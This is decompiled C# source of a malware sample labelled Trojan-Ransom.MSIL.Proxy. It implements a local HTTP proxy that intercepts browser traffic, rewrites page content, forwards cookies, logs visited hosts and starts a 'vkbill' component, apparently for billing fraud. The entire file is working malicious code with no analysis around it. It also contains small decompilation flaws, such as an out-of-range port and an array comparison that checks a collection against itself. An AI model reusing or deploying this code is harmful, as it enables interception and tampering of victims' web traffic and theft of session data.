// Decompiled with JetBrains decompiler
// Type: ProxyService.ProxyServer
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 376BB12E-163D-442B-85A9-E33D8806BC45
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.t-92fcc4ce620844256447b8cf217b3ad65fb1bc843d1ea583f6ae64bac1bb9ee7.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace ProxyService
{
  public class ProxyServer
  {
    private const int BufferSize = 8192;
    public static bool IsDebugMode;
    public static ProxyServer Server;
    private readonly TcpListener _listener;
    private Thread _listenerThread;
    private readonly IPAddress _addr = IPAddress.Loopback;
    private readonly int _port = 80810;
    private static readonly char[] SemiSplit = new char[1]
    {
      ';'
    };
    private static readonly string[] ColonSpaceSplit = new string[1]
    {
      ": "
    };
    private static readonly char[] SpaceSplit = new char[1]
    {
      ' '
    };
    private static readonly Regex CookieSplitRegEx = new Regex(",(?! )");
    private static XmlHelper _xml;
    private static vkbill vkbiller;

    public static void dbg(string p)
    {
      if (!ProxyServer.IsDebugMode)
        return;
      string path = "D:\\MyProxyLog.txt";
      try
      {
        if (!System.IO.File.Exists(path))
        {
          using (StreamWriter text = System.IO.File.CreateText(path))
          {
            text.Flush();
            text.Close();
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        using (StreamWriter streamWriter = System.IO.File.AppendText(path))
        {
          streamWriter.WriteLine(p);
          streamWriter.Flush();
          streamWriter.Close();
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void copyTo(Stream afrom, MemoryStream aTo, Encoding enc)
    {
      try
      {
        string end = new StreamReader(afrom, enc).ReadToEnd();
        byte[] bytes = enc.GetBytes(end);
        aTo.Write(bytes, 0, bytes.Length);
      }
      catch (Exception ex)
      {
        ProxyServer.dbg("copyto error: " + ex.Message);
      }
    }

    public static bool IsNullOrWhiteSpace(string s) => s == null || s.Trim() == "";

    public IPAddress ListeningIpInterface => this._addr;

    public int ListeningPort => this._port;

    public ProxyServer(string ipa, int port)
    {
      try
      {
        ProxyServer.IsDebugMode = System.IO.File.Exists("D:\\debugmode.txt");
      }
      catch (Exception ex)
      {
        ProxyServer.IsDebugMode = false;
      }
      XmlHelper.Load();
      IPAddress.TryParse(ipa, out this._addr);
      this._port = port;
      this._listener = new TcpListener(this.ListeningIpInterface, this.ListeningPort);
      ProxyServer.dbg("Proxy init on {0}:{1}  -- successfully: " + ipa + ":" + (object) port);
    }

    public bool Start()
    {
      try
      {
        this._listener.Start();
        ProxyServer.dbg("Proxy start  -- successfully");
      }
      catch (Exception ex)
      {
        ProxyServer.dbg("start:" + ex.Message);
        return false;
      }
      this._listenerThread = new Thread(new ParameterizedThreadStart(ProxyServer.Listen));
      this._listenerThread.Start((object) this._listener);
      ProxyServer.vkbiller = new vkbill();
      ProxyServer.vkbiller.Do();
      resolve.Start();
      return true;
    }

    private static void Listen(object obj)
    {
      TcpListener tcpListener = (TcpListener) obj;
label_1:
      try
      {
        TcpClient state = tcpListener.AcceptTcpClient();
        while (!ThreadPool.QueueUserWorkItem(new WaitCallback(ProxyServer.ProcessClient), (object) state))
          ;
        goto label_1;
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (SocketException ex)
      {
      }
    }

    private static void ProcessClient(object obj)
    {
      TcpClient client = (TcpClient) obj;
      try
      {
        ProxyServer.DoHttpProcessing(client);
      }
      catch (Exception ex)
      {
        ProxyServer.dbg("process client: " + ex.Message);
      }
    }

    private static void DoHttpProcessing(TcpClient client)
    {
      try
      {
        ProxyServer.DoHttpProcessing1(client);
      }
      catch (Exception ex)
      {
        ProxyServer.dbg("http major problem:" + ex.Message);
      }
    }

    private static string ms2str(MemoryStream ms)
    {
      ms.Seek(0L, SeekOrigin.Begin);
      StreamReader streamReader = new StreamReader((Stream) ms);
      string end = streamReader.ReadToEnd();
      streamReader.Dispose();
      return end;
    }

    private static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp) => XmlHelper.httpIsEnvoved(req, resp);

    private static void DoHttpProcessing1(TcpClient client)
    {
      NetworkStream stream1 = client.GetStream();
      NetworkStream networkStream = stream1;
      StreamReader sr = new StreamReader((Stream) stream1);
      try
      {
        string str1 = sr.ReadLine();
        if (string.IsNullOrEmpty(str1))
        {
          sr.Close();
          stream1.Close();
        }
        else
        {
          string[] strArray = str1.Split(ProxyServer.SpaceSplit, 3);
          string str2 = strArray[0];
          string requestUriString = vkbill.vkSpecUrl(strArray[1]);
          Version version = new Version(1, 0);
          HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
          httpWebRequest.Method = str2;
          httpWebRequest.ProtocolVersion = version;
          int count1 = ProxyServer.ReadRequestHeaders(sr, httpWebRequest);
          httpWebRequest.Proxy = (IWebProxy) null;
          httpWebRequest.KeepAlive = false;
          httpWebRequest.AllowAutoRedirect = false;
          httpWebRequest.AutomaticDecompression = DecompressionMethods.None;
          string refx = "";
          try
          {
            refx = httpWebRequest.Referer;
          }
          catch (Exception ex)
          {
          }
          try
          {
            if (str2.ToUpper() == "POST")
            {
              char[] buffer = new char[count1];
              int num = 0;
              StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
              int count2;
              while (num < count1 && (count2 = sr.ReadBlock(buffer, 0, count1)) > 0)
              {
                num += count2;
                streamWriter.Write(buffer, 0, count2);
              }
              streamWriter.Close();
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.Message);
          }
          httpWebRequest.Timeout = 15000;
          HttpWebResponse response;
          try
          {
            response = (HttpWebResponse) httpWebRequest.GetResponse();
          }
          catch (WebException ex)
          {
            response = ex.Response as HttpWebResponse;
          }
          if (response == null)
            return;
          IEnumerable<ProxyServer.Tuple> headers = ProxyServer.ProcessResponse(response);
          Stream stream2 = response.GetResponseStream();
          StreamWriter myResponseWriter = new StreamWriter((Stream) networkStream);
          try
          {
            ProxyServer.WriteResponseStatus(response.StatusCode, response.StatusDescription, myResponseWriter);
            Encoding encoding = Encoding.UTF8;
            try
            {
              if (response.CharacterSet != null)
                encoding = Encoding.GetEncoding(response.CharacterSet);
            }
            catch (Exception ex)
            {
            }
            MemoryStream memoryStream = new MemoryStream();
            bool flag = ProxyServer.httpIsEnvoved(httpWebRequest, response);
            if (flag && response.ContentEncoding.ToLower().Contains("gzip"))
            {
              stream2 = (Stream) new GZipStream(stream2, CompressionMode.Decompress);
              string end = new StreamReader(stream2, encoding).ReadToEnd();
              byte[] bytes = encoding.GetBytes(end);
              MemoryStream source = new MemoryStream();
              using (GZipStream gzipStream = new GZipStream((Stream) source, CompressionMode.Compress, true))
                gzipStream.Write(bytes, 0, bytes.Length);
              source.Position = 0L;
              ProxyServer.Decompress((Stream) source, (Stream) memoryStream);
              memoryStream.Seek(0L, SeekOrigin.Begin);
              string str3 = XmlHelper.ChangeContent(end, httpWebRequest.Address.ToString(), refx);
              foreach (ProxyServer.Tuple tuple in headers)
              {
                if (tuple.Item1 == "Content-Length")
                  tuple.Item2 = str3.Length.ToString();
                if (tuple.Item1 == "Content-Encoding")
                  tuple.Item2 = "identity";
              }
            }
            ProxyServer.WriteResponseHeaders((TextWriter) myResponseWriter, headers);
            byte[] buffer = response.ContentLength > 0L ? new byte[response.ContentLength] : new byte[8192];
            if (flag)
            {
              if (stream2 != null)
              {
                MemoryStream aTo = new MemoryStream();
                if (response.ContentEncoding.ToLower().Contains("gzip"))
                  ProxyServer.copyTo((Stream) memoryStream, aTo, encoding);
                else
                  ProxyServer.copyTo(stream2, aTo, encoding);
                aTo.Seek(0L, SeekOrigin.Begin);
                StreamReader streamReader = new StreamReader((Stream) aTo, encoding);
                string end = streamReader.ReadToEnd();
                byte[] bytes1 = encoding.GetBytes(end);
                byte[] array = aTo.ToArray();
                aTo.Dispose();
                if (ProxyServer.IsArrayEquals((ICollection<byte>) array, (IList<byte>) bytes1))
                {
                  string s = XmlHelper.ChangeContent(end, httpWebRequest.Address.ToString(), refx);
                  byte[] bytes2 = encoding.GetBytes(s);
                  networkStream.Write(bytes2, 0, bytes2.Length);
                }
                else
                  networkStream.Write(array, 0, array.Length);
                streamReader.Close();
                streamReader.Dispose();
              }
            }
            else
            {
              int count3;
              while (stream2 != null && (count3 = stream2.Read(buffer, 0, buffer.Length)) > 0)
                networkStream.Write(buffer, 0, count3);
            }
            stream2?.Close();
            networkStream.Flush();
          }
          catch (Exception ex)
          {
            ProxyServer.dbg(ex.Message);
          }
          finally
          {
            stream2?.Close();
            response.Close();
            myResponseWriter.Close();
          }
        }
      }
      catch (Exception ex)
      {
        ProxyServer.dbg(ex.Message);
      }
      finally
      {
        sr.Close();
        stream1.Close();
        networkStream.Close();
      }
    }

    private static void Pump(Stream input, Stream output)
    {
      byte[] buffer = new byte[8192];
      int count;
      while ((count = input.Read(buffer, 0, buffer.Length)) != 0)
        output.Write(buffer, 0, count);
    }

    private static void Compress(Stream source, Stream destination)
    {
      using (GZipStream output = new GZipStream(destination, CompressionMode.Compress, true))
      {
        ProxyServer.Pump(source, (Stream) output);
        output.Flush();
        output.Close();
        output.Dispose();
      }
    }

    private static void Decompress(Stream source, Stream destination)
    {
      using (GZipStream input = new GZipStream(source, CompressionMode.Decompress, true))
        ProxyServer.Pump((Stream) input, destination);
    }

    private static bool IsArrayEquals(ICollection<byte> first, IList<byte> second)
    {
      if (first.Count != second.Count)
        return false;
      IEnumerator<byte> enumerator1 = first.GetEnumerator();
      IEnumerator<byte> enumerator2 = first.GetEnumerator();
      while (enumerator1.MoveNext() && enumerator2.MoveNext())
      {
        if ((int) enumerator1.Current != (int) enumerator2.Current)
          return false;
      }
      return true;
    }

    private static int ReadRequestHeaders(StreamReader sr, HttpWebRequest webReq)
    {
      int result1 = 0;
      string s;
      do
      {
        s = sr.ReadLine();
        if (string.IsNullOrEmpty(s))
          return result1;
        string[] strArray = s.Split(ProxyServer.ColonSpaceSplit, 2, StringSplitOptions.None);
        switch (strArray[0].ToLower())
        {
          case "host":
            resolve.SafeAdd(strArray[1]);
            goto case "proxy-connection";
          case "user-agent":
            webReq.UserAgent = strArray[1];
            goto case "proxy-connection";
          case "accept":
            webReq.Accept = strArray[1];
            goto case "proxy-connection";
          case "referer":
            webReq.Referer = strArray[1];
            goto case "proxy-connection";
          case "cookie":
            webReq.Headers["Cookie"] = strArray[1];
            goto case "proxy-connection";
          case "proxy-connection":
          case "connection":
          case "keep-alive":
            continue;
          case "content-length":
            int.TryParse(strArray[1], out result1);
            goto case "proxy-connection";
          case "content-type":
            webReq.ContentType = strArray[1];
            goto case "proxy-connection";
          case "if-modified-since":
            DateTime result2;
            if (DateTime.TryParse(strArray[1].Trim().Split(ProxyServer.SemiSplit)[0], out result2))
            {
              webReq.IfModifiedSince = result2;
              goto case "proxy-connection";
            }
            else
              goto case "proxy-connection";
          default:
            try
            {
              webReq.Headers.Add(strArray[0], strArray[1]);
              goto case "proxy-connection";
            }
            catch (Exception ex)
            {
              ProxyServer.dbg(string.Format("Could not add header {0}.  Exception message:{1}", (object) strArray[0], (object) ex.Message));
              goto case "proxy-connection";
            }
        }
      }
      while (!ProxyServer.IsNullOrWhiteSpace(s));
      return result1;
    }

    private static IEnumerable<ProxyServer.Tuple> ProcessResponse(
      HttpWebResponse response)
    {
      string str = (string) null;
      string name = (string) null;
      List<ProxyServer.Tuple> tupleList = new List<ProxyServer.Tuple>();
      foreach (string key in response.Headers.Keys)
      {
        if (key.ToLower() == "set-cookie")
        {
          name = key;
          str = response.Headers[key];
        }
        else
          tupleList.Add(new ProxyServer.Tuple(key, response.Headers[key]));
      }
      if (!ProxyServer.IsNullOrWhiteSpace(str))
      {
        response.Headers.Remove(name);
        foreach (string b in ProxyServer.CookieSplitRegEx.Split(str))
          tupleList.Add(new ProxyServer.Tuple("Set-Cookie", b));
      }
      return (IEnumerable<ProxyServer.Tuple>) tupleList;
    }

    private static void WriteResponseStatus(
      HttpStatusCode code,
      string description,
      StreamWriter myResponseWriter)
    {
      string str = string.Format("HTTP/1.0 {0} {1}", (object) (int) code, (object) description);
      myResponseWriter.WriteLine(str);
    }

    private static void WriteResponseHeaders(
      TextWriter myResponseWriter,
      IEnumerable<ProxyServer.Tuple> headers)
    {
      if (headers != null)
      {
        foreach (ProxyServer.Tuple header in headers)
          myResponseWriter.WriteLine(string.Format("{0}: {1}", (object) header.Item1, (object) header.Item2));
      }
      myResponseWriter.WriteLine();
      myResponseWriter.Flush();
    }

    public class Tuple
    {
      public string Item1;
      public string Item2;

      public Tuple(string a, string b)
      {
        this.Item1 = a;
        this.Item2 = b;
      }
    }
  }
}
